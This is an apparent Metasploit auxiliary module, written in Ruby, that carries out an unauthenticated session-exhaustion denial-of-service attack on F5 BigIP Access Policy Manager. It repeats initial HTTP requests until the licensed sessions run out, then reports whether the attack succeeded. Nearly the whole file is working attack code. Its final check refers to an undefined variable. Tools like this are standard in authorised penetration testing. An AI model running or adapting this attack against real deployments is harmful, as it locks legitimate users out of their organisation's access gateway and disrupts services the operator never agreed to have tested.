##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'F5 BigIP APM Unauthenticated Session Exhaustion Denial of Service',
      'Description'    => %q{
        An unauthenticated attacker can establish multiple connections with BigIP Access Policy Manager
        and exhaust all available sessions defined in customer\'s license.
        In the first step of BigIP APM protocol the client sends a HTTP request.
        The BigIP system creates a session, marks it as progress (pending) and then redirects client to access policy URI.
        Since BigIP allocates a new session after the first unauthenticated request and deletes the session only if an access policy timeout will be expired
        the attacker can exhaust all available sessions repeatedly sending initial HTTP request.
      },
      'Author'         =>
        [
         'Oleg Broslavsky <ovbroslavsky[at]gmail.com>',
         'Nikita Oleksov <neoleksov[at]gmail.com>',
         'Denis Kolegov <dnkolegov[at]gmail.com>',
         ],
      'References'     =>
        [
          ['URL', 'https://support.f5.com/kb/en-us/products/big-ip_apm/releasenotes/product/relnote-apm-11-6-0.html']
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'SSLVersion' => 'TLS1'
        }
    ))

    register_options(
      [
        OptPort.new('RPORT', [true, 'The BigIP service port to listen on', 443]),
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", true]),
        OptInt.new('RLIMIT', [true, 'The number of requests to send', 10000])
      ], self.class)
  end

  def run
    # Main function
      datastore['SSL']? proto = 'https' : proto = 'http'

    # Send an initial test request
      res = send_request_cgi('method' => 'GET', 'uri' => '/')
      if res
        print_status("#{peer} - Starting DoS attack")
      else
        print_error("#{proto}://#{rhost}:#{rport} - Unable to connect to BIgIP. Please check options")
        return
      end

    # Start attack
      for i in 1..datastore['RLIMIT']
        res = send_request_cgi('method' => 'GET', 'uri' => '/')
        if res and res.headers['Location'] == '/my.logout.php3?errorcode=14'
          print_status("#{peer} - The maximum number of concurrent user sessions has been reached. No new user sessions can start at this time")
          print_status("#{peer} - DoS attack is successful")
          return;
        end
      end

    # Check if attack is unsuccessfull
      res = send_request_cgi('method' => 'GET', 'uri' => uri)
      if res.headers['Location'] == '/my.policy'
        print_status("#{peer} - DoS attack is unsuccessful. Try to increase the RLIMIT number")
      else
        print_status("#{peer} - Result is undefined. Try to manually determine DoS attack result")
      end

    rescue ::Rex::ConnectionRefused
      print_error("#{proto}://#{rhost}:#{rport} - Unable to connect to BigIP")
    rescue ::Rex::ConnectionTimeout
      print_error("#{proto}://#{rhost}:#{rport} - Unable to connect to BigIP. Please check options")
    rescue ::Errno::ECONNRESET
      print_error("#{peer} - The connection was reset. Probably BigIP \"Max In Progress Sessions Per Client IP\" counter was reached")
      print_status("#{peer} - DoS attack is unsuccessful")
    rescue ::OpenSSL::SSL::SSLError
     print_error("#{peer} - SSL/TLS connection error")

  end

end
